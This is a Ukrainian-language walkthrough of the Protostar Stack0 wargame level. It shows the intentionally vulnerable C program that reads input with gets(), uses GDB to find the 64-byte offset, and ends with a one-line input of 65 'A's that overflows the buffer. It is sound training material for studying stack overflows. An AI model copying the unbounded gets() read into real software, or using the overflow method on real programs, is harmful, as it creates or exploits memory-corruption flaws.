# STACK0

Цей рівень представляє концепцію того, що доступ до пам’яті може бути за межами виділеної області, як розміщені змінні стека, і що зміна за межами виділеної пам’яті може змінити виконання програми.

Вихідний код Stack0:

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
Перейдемо до каталогу де знаходиться Stack0:
```
cd /opt/protostar/bin
```
Запустимо програму всередині GDB. Для цього ми запускаємо таку команду.
```
gdb stack0
```
Подивившись на вихідний код, здається, що зупинити виконання безпосередньо перед запуском рядка 13 було б хорошою ідеєю. Щоб встановити точку розриву, ми введемо:
```
break 13
```
Тепер запустимо програму на виконання з вхідним рядком - AAAA

Дві наші змінні, модифікована і буферна, є локальними змінними, тому вони будуть розташовані в кадрі стека. Знайшовши розташування покажчика стека, ми можемо знайти ці змінні в пам’яті. Для цього ми введемо наступне
```
x/32x $esp
```
![image](https://user-images.githubusercontent.com/47494881/147463075-556d353e-8f3b-4253-af3d-73c8b63fe695.png)

Якщо уважніше поглянути на пам’ять, ми бачимо один фрагмент даних, який не схожий на інші — серію з 4 байтів, кожен із яких містить значення 41. Якби ми розглянули цю адресу як рядок, ми б побачили, що це є чотири "A", які ми ввели, коли вперше запускали програму.

![image](https://user-images.githubusercontent.com/47494881/147461367-7291b4c4-2caa-4ee8-8c1d-e2641e9a0740.png)

Щоб знайти розташування адреси змінної:
```
info address modified
x/x $esp + 92
```
![image](https://user-images.githubusercontent.com/47494881/147461612-c3df38fd-4599-4361-8790-95f8cb2b8292.png)

Щоб визначити, скільки символів нам знадобиться, використовуючи наступну команду
```
p 0xbffffcac - 0xbffffc6c
```
![image](https://user-images.githubusercontent.com/47494881/147461805-7bc8acda-406f-4c2a-803e-df9c4be28042.png)

Вихід $1 = 64 говорить нам, що між буфером і зміненим є 64 байти.

Однак, якщо використати описану вразливість функції gets() і передати рядок розміром більше 64 байти, то змінна modified буде перезаписана. Що нам і потрібно!

![image](https://user-images.githubusercontent.com/47494881/147462539-f2c4386a-d848-4e38-93e3-a539db3f5387.png)

Команда:

```
python -c "print('A' * 65)" | ./stack0
```
